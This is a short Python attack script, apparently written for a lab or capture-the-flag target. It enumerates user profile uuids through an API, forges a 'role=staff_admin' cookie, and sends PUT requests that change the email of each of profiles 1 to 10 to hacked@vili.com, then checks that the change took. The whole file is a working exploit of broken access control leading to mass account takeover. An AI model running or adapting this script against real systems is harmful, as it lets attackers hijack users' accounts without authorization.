import requests 

# Defining the URLs
base_url = "http://IPPORT:PORT/"
api_endpoint = "profile/api.php/profile/"
uid = list(range(1,11))
admin_cookie = dict(role="staff_admin")
proxie = {"http":"http://127.0.0.1:8080"
          }

url_req = requests.get(base_url + api_endpoint)
print(f"Checking if the website is up: {url_req.status_code}")

              

# Loop through all uids and store the response in a dictionary uuid
uuid = []

for uids in uid:
    url_req = requests.get(base_url + api_endpoint + str(uids), proxies=proxie)
    profile = url_req.json()
    uuid.append(profile['uuid'])
    
# Small logic if you want to print the uuids
ans = input("Do you want to display the uuids? ")
if ans == 'yes':
    print(uuid)
    print(f"Uuid values in the list: {len(uuid)}")
else:
    print("Continuing the program!")

# Sending the PUT request with the already stored uuids. 
# The goal is to change the email addresses of the users to hacked@vili.com

for pops_uid,pops_uuid in zip(uid,uuid):
    payload = {
        "uid": pops_uid,
        "uuid": pops_uuid,
        "role": "employee",
        "email": "hacked@vili.com"
    }
    # Debugging: inspect the values
    print("UID in URL:", pops_uid)
    print("UID in JSON:", payload["uid"])
    print("UUID:", payload["uuid"])
    
    put_request = requests.put(base_url + api_endpoint + str(pops_uid), cookies=admin_cookie, json=payload, proxies=proxie)

# Once the PUT request is made, another enumeration will go through and display a successful message if the email was changed.

email = "hacked@vili.com"

for uids2 in uid:
    url_req = requests.get(base_url + api_endpoint + str(uids2))
    profile2 = url_req.json()


    # Check the email field, not the UUID list
    if profile2.get("email") == email:
        print(f"Profile {uids2}: email verified")
    else:
        print(f"Profile {uids2}: email does not match")
